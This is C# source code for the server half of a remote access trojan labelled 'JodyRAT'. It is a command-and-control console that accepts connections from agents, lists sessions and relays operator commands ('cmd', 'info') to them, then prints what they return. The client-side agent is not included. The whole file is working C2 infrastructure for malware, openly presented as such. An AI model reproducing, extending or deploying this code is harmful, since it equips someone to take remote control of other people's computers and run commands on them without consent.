using System;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using System.Collections.Generic;
using System.Text;

/// <summary> Holds global configuration constants for the application </summary>
class ServerConstants{
    public const string SERVER_HOST = "127.0.0.1";
    public const int SERVER_PORT = 8000;
    public const string PROMPT = "JodyRAT> ";
}

/// <summary> The main Server class. Responsible for creating the main listener as well as a ClientHandler for each agent</summary>
class Server {

    private static List<ClientHandler> ClientList;    
    private static string Prompt = ServerConstants.PROMPT;

    static void Main(string[] args){
        ClientList = new List<ClientHandler>();         
        Server.Log(String.Format("Initializing server on {0}:{1}", ServerConstants.SERVER_HOST, ServerConstants.SERVER_PORT));
        TcpListener Sock = new TcpListener(IPAddress.Parse(ServerConstants.SERVER_HOST), ServerConstants.SERVER_PORT);
        ServerListener Listener = new ServerListener();
        Listener.Start(Sock);
        Thread.Sleep(1000);

        // Launch interactive command interface for user
        bool KeepGoing = true;
        int CurrentSession = -1;        
        while(KeepGoing){
            MakePrompt();
            string UserInput = Console.ReadLine();
            string[] UserInputTokens = UserInput.Split(' ');            
            switch(UserInputTokens[0].ToLower()){
                case "quit":
                    KeepGoing = false;
                    foreach(ClientHandler client in ClientList){
                        client.SendClientCommand("quit");
                    }
                break;
                case "back":
                    CurrentSession = -1;
                    Prompt = ServerConstants.PROMPT;
                break;
                case "list":
                    for(int ctr = 0; ctr < ClientList.Count; ctr++){
                        Console.WriteLine(ctr);                        
                    }
                break;
                case "enter":
                    try{
                        string SessionID = UserInputTokens[1];
                        CurrentSession = Int16.Parse(SessionID);
                        Console.WriteLine("Entering session " + SessionID);
                        Prompt = String.Format("{0}({1}) ",ServerConstants.PROMPT, CurrentSession);
                    }catch(Exception){
                        CurrentSession = -1;
                        Prompt = ServerConstants.PROMPT;
                        LogError("Error in entering specified session");
                    }
                break;
                case "cmd": case "info":
                    if(CurrentSession == -1){
                        LogError("This Command can only be used after a session has been selected");
                    }else{
                        try{
                            ClientList[CurrentSession].SendClientCommand(UserInput);
                            Thread.Sleep(100);
                        }catch(ArgumentOutOfRangeException){
                            LogError("The specified session does not exist");
                        }catch(Exception){
                            LogError("Error in sending command to selected session");
                        }
                    }
                break;
                case "":
                break;
                default:
                    LogError("Unknown command: " + UserInput);
                break;
            }
        }
        Listener.Stop();
        foreach (ClientHandler Client in ClientList){
            Client.Stop();
        }

    }

    private static void MakePrompt(){
        Console.ForegroundColor = ConsoleColor.Green;
        Console.Write(Prompt);
        Console.ResetColor();
    }

    public static void AddClient(ClientHandler s){
        ClientList.Add(s);
    }

    public static void ClientResponse(string s){
        Console.WriteLine("\n");
        Console.WriteLine(s);        
    }

    public static void Log(string l){
        Console.WriteLine();
        Console.WriteLine(l);
    }

    public static void LogError(string l){
        Console.ForegroundColor = ConsoleColor.Red;
        Console.WriteLine("[!] {0}",l);
        Console.ResetColor();        
    }

}

/// <summary>The Server creates one instance of this class in order to listen for connections from Agents when they come online. </summary>
/// <remarks>When an Agent comes online, a ClientHandler is created for it and the main Server is notified to add the new Agent to its list.</remarks>
class ServerListener{

    private TcpListener Sock;
    private Thread LThread;
    private bool Active;

    public void Start(TcpListener s){
        Sock = s;        
        Active = true;
        LThread = new Thread(ListenerThread);
        LThread.Start();
    }

    public void Stop(){
        Active = false;
        Sock.Stop();
    }

    private void ListenerThread(){
        Server.Log("Starting Server Listener Thread");
        while(true){
            if(!Active){
                return;
            }
            try{
                Sock.Start();
                TcpClient Client = Sock.AcceptTcpClient();
                ClientHandler Handler = new ClientHandler();
                Handler.Start(Client);
                Server.AddClient(Handler);
            }catch(SocketException e){
                if(e.ErrorCode == (int)SocketError.Interrupted && !Active){
                    //  Do nothing. This is the exception generated when the blocking socket operation is cancelled when we shut down the thread.
                }else{
                    Server.LogError(String.Format("Socket Exception!\n{0}:{1}", e.ErrorCode,e.Message));
                }
            }            
        }
    }
}

/// <summary>The ClientHandler is responsible for interacting with a single Agent, passing commands and receiving responses, which are passed back to the main Server</summary>
class ClientHandler {
    
    private TcpClient Client;
    private Queue<string> NextCmds;
    private bool Active;

    public void Start(TcpClient c){
        Server.Log("Starting ClientHandler Thread");        
        Active = true;
        Client = c;
        NextCmds = new Queue<string>();
        Thread CThread = new Thread(HandleClient);
        CThread.Start();
    }

    public void Stop(){
        Active = false;
    }

    public void SendClientCommand(string cmd){
        NextCmds.Enqueue(cmd);
    }

    private void HandleClient(){
        while(true){
            if(!Active){
                return;
            }
            if(NextCmds.Count > 0){
                // Send command
                NetworkStream stream = Client.GetStream();
                string NextCmd = NextCmds.Dequeue();
                byte[] Bytes = Encoding.ASCII.GetBytes(NextCmd);
                stream.Write(Bytes, 0, Bytes.Length);
                stream.Flush();

                // Receive response
                Bytes = new byte[Client.ReceiveBufferSize];
                int BytesLen = stream.Read(Bytes,0,Client.ReceiveBufferSize);
                string Result = Encoding.ASCII.GetString(Bytes,0,BytesLen);
                Server.ClientResponse(Result);
            }   
            Thread.Sleep(50);
        }
    }
}